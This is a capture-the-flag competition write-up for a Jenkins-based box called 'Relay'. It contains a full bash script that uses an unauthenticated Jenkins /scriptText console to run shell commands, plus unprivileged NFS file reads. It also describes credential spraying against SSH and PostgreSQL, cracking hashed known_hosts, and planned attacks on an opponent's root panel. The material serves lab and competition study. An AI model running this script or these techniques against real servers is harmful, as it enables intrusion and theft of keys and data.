# Relay

## Summary

The Relay box was a multi-container Docker stack (Jenkins 2.426.2 + PostgreSQL + SMTP relay + kernel-NFS) on a Debian 13 host. Jenkins ran with **`useSecurity: false`**, giving anonymous full-admin access and therefore an **unauthenticated Groovy script-console RCE** (`/scriptText`) as uid 1000 `jenkins` inside the controller container — no CVE exploitation needed (the box's *intended* entry, per the flag name, was CVE-2024-23897 file-read; the open console is strictly stronger). Two of the four flags were captured. The **root path was never solved**: both leaked SSH keys are dead (host `authorized_keys` were never restored after the box rebuild), NFS is read-only, PostgreSQL resisted ~135 credential combinations, and SMTP :25 blackholes external data. The live lead at session end: an opponent team's root-level web panel on the host.

## How far we got

| Objective | Status | Evidence |
|---|---|---|
| Recon / full port surface | ✅ | `22 25 111 2049 5432 8080 60251` — only via ~1 conn/2.5s spaced probes |
| Foothold RCE (jenkins, container `7a6986e84c80`) | ✅ | `/scriptText` exec, `id` → `uid=1000(jenkins)` |
| Flag 1 — web/Jenkins | ✅ | `Legion{r3l4y_svc_jenkins_cve_2024_23897}` |
| Flag 2 — NFS | ✅ | `Legion{r3l4y_svc_nfs_export_key_leak}` |
| Flag 3 — user-tier (host) | ❌ | requires host access |
| Flag 4 — root (host `/root/flag*`) | ❌ | requires host root |
| King claim (`/root/king.txt` = `ThundersFist`) + kingmaker | ❌ | blocked on host root |
| Faction MCP trail | ✅ | Assessment 2: VID-3091500 (first instance), VID-7413500 (reset instance) |

## Solution

### Step 1 — Defeat the connection rate-limiter, map the surface

The box drops burst traffic: a standard `nmap --min-rate 5000 -p-` scan sees an **all-filtered** surface and hits "retransmission cap" warnings, while ~1 connection per 2.5 s gets clean answers. Only a slow spaced probe (and later a full 1–65535 sweep **from inside the docker bridge**, where there is no limiter) reveals the real port set. Evidence files: `nmap-quick.txt`, `nmap-full2.txt` (the 60251 discovery) in the project root.

```
22   OpenSSH 10.0p2 Debian-13 (host sshd — host-key identical on external :22 and bridge 172.17.0.1:22)
25   SMTP (docker-published container; blackholes external data, unreachable from bridge — DNAT skips docker ingress)
111 + 2049 + 60251  rpcbind / kernel nfsd / mountd
5432 PostgreSQL (host-level, password auth)
8080 Jenkins 2.426.2 on Jetty 10.0.18 (controller container)
```

### Step 2 — Unauthenticated Groovy RCE via `/scriptText`

`GET /api/json` (anonymous) returns `"useSecurity": false` → authorization strategy is `Unsecured` (confirmed in `config.xml`: `hudson.security.AuthorizationStrategy$Unsecured`). The script console is therefore open to anonymous. POSTs need a **fresh session cookie + crumb per request** (crumbs are session- and client-IP-bound; `excludeClientIPFromCrumb: false`), and every request must be spaced or the limiter eats it. This was wrapped in a retry runner (`jk.sh`) used for every subsequent command — the box was driven end-to-end over this HTTP C2 channel (no reverse shell needed; the Kali sat behind NAT anyway).

### Step 3 — Capture both flags (Jenkins `/keys` + NFS `/srv/nfs`)

* **Flag 1**: `/keys/fl4g.txt` inside the container — `/keys` is a **read-only bind of host `/opt/relay/keys`** (per `/proc/self/mountinfo`), containing `fl4g.txt`, `id_rsa` (full RSA key, comment `builder@relay`) and `id_rsa.b64` (verified byte-identical to `id_rsa`).
* **Flag 2**: `/srv/nfs/fl4g.txt` — the host's NFS export `/srv/nfs` is world-exported (`showmount -e` works with patience). Read **without root on Kali** by downloading the `libnfs-utils` package unprivileged (`apt-get download libnfs-utils && dpkg -x …`) and using the bundled `nfs-ls`/`nfs-cat` binaries. NFSv4 also serves the same tree (`nfs://host/?version=4` → pseudo-root `/srv`).

One complete reproduction script (surface → RCE proof → both flags):

```bash
#!/usr/bin/env bash
# Relay box (Jenkins class) — surface check, unauth RCE proof, both service flags.
# ThundersFist / Lernaean Siege 2026-09-13.  Usage: ./relay_flags.sh <target-ip>
# The box DROPS bursts: every connection is spaced >=2.5s. Fast nmap = all-filtered.
set -u
T="${1:?target ip}"; SP=2.5; slow(){ sleep "$SP"; }

echo "== surface (spaced probes) =="
for p in 22 25 111 2049 5432 8080; do
  timeout 4 bash -c "exec 3<>/dev/tcp/$T/$p" 2>/dev/null && echo "OPEN: $p"; slow
done

echo "== jenkins: unauth admin check + flag 1 via scriptText RCE =="
curl -s -m 15 "http://$T:8080/api/json" | grep -o '"useSecurity":[a-z]*'   # expect false
GROOVY='println(["/bin/sh","-c","cat /keys/fl4g.txt"].execute().text)'
for i in 1 2 3; do                       # fresh crumb+session per POST (IP-bound crumbs)
  rm -f /tmp/jk.cj
  PAGE=$(curl -s -m 20 -c /tmp/jk.cj "http://$T:8080/script"); slow
  CRUMB=$(grep -oP 'data-crumb-value="\K[^"]+' <<<"$PAGE" | head -1); [ -n "$CRUMB" ] || continue
  OUT=$(curl -s -m 90 -b /tmp/jk.cj -H "Jenkins-Crumb: $CRUMB" \
        --data-urlencode "script=$GROOVY" "http://$T:8080/scriptText"); slow
  grep -q 'Legion{' <<<"$OUT" && { echo "FLAG1: $OUT"; break; }
done

echo "== nfs: flag 2 via unprivileged libnfs tools (no root on kali) =="
mkdir -p /tmp/nfsdev && cd /tmp/nfsdev
apt-get download libnfs-utils >/dev/null 2>&1
dpkg -x libnfs-utils_*_amd64.deb utils/
./utils/usr/bin/nfs-cat "nfs://$T/srv/nfs/fl4g.txt"; echo
# bonus (asset, not printed by design): ./utils/usr/bin/nfs-cat nfs://$T/srv/nfs/keys/deploy_id_ed25519
```

Actual output (both instances, values identical across the mid-session box reset — flags are class constants):

```
OPEN: 22 / OPEN: 25 / OPEN: 111 / OPEN: 2049 / OPEN: 5432 / OPEN: 8080
"useSecurity":false
FLAG1: Legion{r3l4y_svc_jenkins_cve_2024_23897}
Legion{r3l4y_svc_nfs_export_key_leak}
```

## Flags

```
Legion{r3l4y_svc_jenkins_cve_2024_23897}   # /keys/fl4g.txt (bind of host /opt/relay/keys) — web tier
Legion{r3l4y_svc_nfs_export_key_leak}      # /srv/nfs/fl4g.txt (world NFS export) — service tier
# user-tier and root (/root/flag*) flags: NOT captured — no host access this session
```

Operational assets also extracted (not reproduced here by design): full `builder@relay` RSA key (`/keys/id_rsa`) and `deploy@relay` ED25519 key (`/srv/nfs/keys/deploy_id_ed25519`, whose README reads *"deploy CI key backup. Restore to ~deploy/.ssh/ on rebuild"*). Local copies lived at `/tmp/relay_key2`, `/tmp/deploy_key2` during the round; `/tmp` has since been cleared.

## Root-path investigation (unsolved — complete dead-end matrix)

Every plausible chain was systematically eliminated; this is the interesting part for anyone re-running this class:

1. **SSH with the leaked keys — dead.** 43 usernames × both keys (via real `ssh` externally and via a JSch 0.2.16 client loaded into the Jenkins JVM and run *from the bridge*, so PerSourcePenalties burned the container IP instead of ours): all `Permission denied (publickey,password)`. External :22 and bridge 172.17.0.1:22 are the **same** host sshd (identical ed25519 host key `AAAAC3...LDK+vxR...`, which also equals the single entry in the container's `known_hosts` — the hashed hostname cracked locally via HMAC-SHA1 to `172.17.0.1`). Conclusion: the box ships **broken by design-flaw** — `authorized_keys` was never restored after rebuild, exactly as the NFS README warns. Same result on both the pre-reset and post-reset instances.
2. **NFS write — dead.** v3 and v4 both return `ROFS` on any create (share is a pure leak channel).
3. **PostgreSQL — dead (credential-wise).** ~135 user/password combinations from the bridge via JDBC (theme passwords, event-pattern passwords like the WatchTower `W@tcht0wer_0ps_2024!` style, plus an 8-db × 7-user `trust` scan): every attempt failed. The real DB password lives only in the host-side `/opt/relay` config.
4. **SMTP :25 — blackholed.** TCP connects externally, but no banner ever arrives (patient 150 s silent-wait sessions still got nothing); from the bridge it's unreachable (`Connection refused` — docker's published-port DNAT skips docker ingress). VRFY/AUTH enumeration impossible.
5. **Container privesc — nothing.** No docker.sock, `CapEff: 0`, default bound caps (no SYS_ADMIN), no cron, no sudo, SUID `mount` is modern util-linux ("must be superuser"), kernel 6.12.94+deb13 (no public LPE), jenkins home is a docker volume (not a host home dir).
6. **Cross-bridge → SMTP container — isolated.** 0 hits across 172.18–172.22.0.x.

### The live lead at session end

A full 1–65535 sweep **from inside the bridge** (no rate limiter there) found host-only ports invisible externally — among them **`172.17.0.1:18080` = "Team PhaZto — Bomb Rush"**, an opponent team's web panel running **as root on the host** (bridge-only, not published). Combined with `/var/jenkins_home/.owner` — a 1-byte file that tracks the **king-holder team number** (`"7"` was written during ZAARA's documented 05:05–05:14 UTC WatchTower king hold; `"8"` appeared at 06:31 UTC on this box's pre-reset instance) — this proves opponents root this box class within ~12 minutes of reveal and leave tooling behind. Mapping/attacking that panel's API is where the root path resumes. (PhaZto is also documented on the later Scribe round in Faction VID-6383500.)

## Event-wide context (Faction MCP, assessment 2)

| Box (class) | IP | Intended vuln | Outcome (team) | Faction VID |
|---|---|---|---|---|
| WatchTower | 167.71.207.59 | Grafana 8.3.0 CVE-2021-43798 file-read → cred-reuse SSH → docker-group root | Rooted, king held, 3 flags | 9333500 / 839500 |
| **Relay (this writeup)** | 143.198.168.247 → 143.198.166.127 | Jenkins CVE-2024-23897 (superseded by open console) | RCE + 2 flags; root unsolved | 3091500 / 7413500 |
| Pillar → Pillar-02 | 209.97.161.126 → 139.59.230.19 | Struts2 S2-045/S2-048 + anon-FTP key + Redis + exposed `.git` | Rooted both instances, quad kingmakers, ZAARA/garuz neutralized | 1738500, 5471500, 389500, 6834500, 6183500, 6364500, 4801500 |
| Broker | 165.245.186.229 | Apache 2.4.49 CVE-2021-41773/42013 | Investigation + wedge intel | 5014500 / 5943500 |
| Scribe-02 | 159.65.140.97 | unknown `/api/*` (PhaZto entry) | PhaZto takeover ~12 min; recon-only | 6383500 |
| Harbor → Harbor-02 | 139.59.242.50 | ActiveMQ CVE-2023-46604 (tight-encoding anti-PoC bypassed) → docker-group root | **Rooted, king `ThundersFist`, root flag `Legion{h4rb0r_multi_privesc_root_pwn}`** | 2225500 / 2035500 / 4116500 |
| Harbour-02 | 167.172.67.79 | Tomcat 9.0.30 Ghostcat (AJP 8009) + docker-group root | Cred carry-over confirmed; deploy in flight | 9258500 |

Cross-cutting facts that paid off on every box: burst-connection rate-limiters (space everything ≥2.5 s; internal bridge sweeps are unlimited), OpenSSH `PerSourcePenalties` (pubkey only, never brute), ZAARA TTY-killers (notty ssh exec only), king at host `/root/king.txt`, and the hardened kingmaker pair `prep/bin/{rsyslogd,fattr}` for holding.

## Lessons

- **`useSecurity:false` beats the intended CVE.** The box was designed around CVE-2024-23897 (per the flag name), but the unsecured Jenkins console gave a strictly stronger primitive with zero exploit development.
- **Hashed `known_hosts` is a free oracle.** A 20-line local HMAC-SHA1 script cracked the entry to `172.17.0.1`, proving external :22 and bridge :22 were the same sshd and collapsing the two-sshd hypothesis.
- **Unprivileged NFS tooling exists.** `apt-get download libnfs-utils && dpkg -x` gives working `nfs-ls/nfs-cat` without root — essential on a sudo-less Kali.
- **Scan from inside when the outside lies.** Every external port scan on this class is garbage; a 400-thread Groovy sweep of the bridge found the real surface (including the opponent's panel) in ~2 minutes.
- **A shipped-broken chain is still informative.** The un-restored `authorized_keys` (per the README) explained *why* the "designed" privesc keys were dead and redirected effort to the opponent-artifact lead instead of more username guessing.
- **Read the signs opponents leave.** `.owner` (king-holder team number) and the PhaZto panel on a host-only port told us exactly how far behind we were and where to look next.
